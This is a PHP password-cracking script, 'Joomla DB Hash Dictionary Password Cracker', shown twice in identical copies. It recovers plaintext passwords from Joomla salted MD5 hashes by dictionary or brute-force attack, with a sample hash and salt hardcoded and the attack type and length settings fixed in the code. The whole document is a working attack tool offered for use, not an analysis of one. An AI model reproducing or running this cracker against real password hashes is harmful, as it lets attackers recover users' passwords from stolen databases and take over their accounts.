<?
echo "//-- Joomla DB Hash Dictionary Password Cracker --//\n";
echo " by the.BWorm\n";
echo "----------------------------------------------------\n";
echo "Insert Joomla Database Hash: ";
$joom_db_hash = trim("757b813bf3d1989f60a4ec7335cfb909:m1hZyvOh2nCA3pPRrT0TU3hSPfFXIhl8");
list($bef_salt, $salt) = explode(":", $joom_db_hash);
$fcheck = 0;
while($fcheck == 0) {
echo "Select attack type\n";
echo "1. Dictionary Attack\n";
echo "2. BruteForce Attack\n";
echo "->";
$attack_type = "2";
if($attack_type == "1" || $attack_type == "2") {
$fcheck = 1;
}
}
if($attack_type == "1") {
$fcheck = 0;
while($fcheck == 0) {
echo "Specify wordlist to use: ";
$pass_list = trim(fgets(STDIN));
if(!file_exists($pass_list)) {
echo "Password file does not exist!\n";
} else {
$fcheck = 1;
}
}
$wordlist = fopen($pass_list, "r");
while (!feof($wordlist)) {
$line = fgets($wordlist);
$line = str_replace("\n", "", $line);
echo $line."\n";
$check = md5($line.$salt).":".$salt;
if($check == $joom_db_hash) {
fclose($wordlist);
echo "——————————-\n";
echo "Password cracked!\n";
echo "WORD: ".$line."\n";
die();
}
}
echo "——————————-\n";
echo "Failed! Try a different wordlist or BruteForce it…\n";
fclose($wordlist);
} elseif($attack_type == "2") {
$check = 0;
while($check == 0) {
echo "Min length: ";
$min_len = trim("6");
if(is_numeric($min_len)) {
$check = 1;
}
}
$check = 0;
while($check == 0) {
echo "Max length: ";
$max_len = trim("25");
if(is_numeric($max_len) && $max_len >= $min_len) {
$check = 1;
}
}

$check = 0;
while($check == 0) {
echo "Default charset is:\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=~!@#$%^&*()_+[]{};'\:\"|,./<>?\n";
echo "1. Default charset\n";
echo "2. Custom charset\n";
echo "->";
$charset_sel = strtolower(trim("1"));
if($charset_sel == "1") {
$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=~!@#$%^&*()_+[]{};'\:\"|,./<>?";
$check = 1;
} elseif($charset_sel == "2") {
echo "Type custom charset: ";
$charset = trim(fgets(STDIN));
$check = 1;
}
}

$charset_len = strlen($charset);
function x ($len, $finlen, $curstring = ''){
global $charset, $charset_len, $salt, $joom_db_hash;
for ($i = 0; $i<$charset_len; $i++)
{
$curstring .= $charset[$i];
if ($len+1 < $finlen)
x($len+1, $finlen, $curstring);
else
echo $curstring . "\n";
$check = md5($curstring.$salt).":".$salt;
if($check == $joom_db_hash) {
echo "-------------------------------\n";
echo "Password cracked!\n";
echo "WORD: ".$curstring."\n";
die();
}
$curstring = substr($curstring, 0 , -1);
}
$curstring = substr($curstring, 0 , -1);
}

$counter = $min_len;
while($counter <= $max_len) {
x(0, $counter);
$counter++;
}
echo "-------------------------------\n";
echo "Failed! Try a different length or try a dictionary...\n";
}
?>
<?
echo "//-- Joomla DB Hash Dictionary Password Cracker --//\n";
echo " by the.BWorm\n";
echo "----------------------------------------------------\n";
echo "Insert Joomla Database Hash: ";
$joom_db_hash = trim("757b813bf3d1989f60a4ec7335cfb909:m1hZyvOh2nCA3pPRrT0TU3hSPfFXIhl8");
list($bef_salt, $salt) = explode(":", $joom_db_hash);
$fcheck = 0;
while($fcheck == 0) {
echo "Select attack type\n";
echo "1. Dictionary Attack\n";
echo "2. BruteForce Attack\n";
echo "->";
$attack_type = "2";
if($attack_type == "1" || $attack_type == "2") {
$fcheck = 1;
}
}
if($attack_type == "1") {
$fcheck = 0;
while($fcheck == 0) {
echo "Specify wordlist to use: ";
$pass_list = trim(fgets(STDIN));
if(!file_exists($pass_list)) {
echo "Password file does not exist!\n";
} else {
$fcheck = 1;
}
}
$wordlist = fopen($pass_list, "r");
while (!feof($wordlist)) {
$line = fgets($wordlist);
$line = str_replace("\n", "", $line);
echo $line."\n";
$check = md5($line.$salt).":".$salt;
if($check == $joom_db_hash) {
fclose($wordlist);
echo "——————————-\n";
echo "Password cracked!\n";
echo "WORD: ".$line."\n";
die();
}
}
echo "——————————-\n";
echo "Failed! Try a different wordlist or BruteForce it…\n";
fclose($wordlist);
} elseif($attack_type == "2") {
$check = 0;
while($check == 0) {
echo "Min length: ";
$min_len = trim("6");
if(is_numeric($min_len)) {
$check = 1;
}
}
$check = 0;
while($check == 0) {
echo "Max length: ";
$max_len = trim("25");
if(is_numeric($max_len) && $max_len >= $min_len) {
$check = 1;
}
}

$check = 0;
while($check == 0) {
echo "Default charset is:\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=~!@#$%^&*()_+[]{};'\:\"|,./<>?\n";
echo "1. Default charset\n";
echo "2. Custom charset\n";
echo "->";
$charset_sel = strtolower(trim("1"));
if($charset_sel == "1") {
$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=~!@#$%^&*()_+[]{};'\:\"|,./<>?";
$check = 1;
} elseif($charset_sel == "2") {
echo "Type custom charset: ";
$charset = trim(fgets(STDIN));
$check = 1;
}
}

$charset_len = strlen($charset);
function x ($len, $finlen, $curstring = ''){
global $charset, $charset_len, $salt, $joom_db_hash;
for ($i = 0; $i<$charset_len; $i++)
{
$curstring .= $charset[$i];
if ($len+1 < $finlen)
x($len+1, $finlen, $curstring);
else
echo $curstring . "\n";
$check = md5($curstring.$salt).":".$salt;
if($check == $joom_db_hash) {
echo "-------------------------------\n";
echo "Password cracked!\n";
echo "WORD: ".$curstring."\n";
die();
}
$curstring = substr($curstring, 0 , -1);
}
$curstring = substr($curstring, 0 , -1);
}

$counter = $min_len;
while($counter <= $max_len) {
x(0, $counter);
$counter++;
}
echo "-------------------------------\n";
echo "Failed! Try a different length or try a dictionary...\n";
}
?>
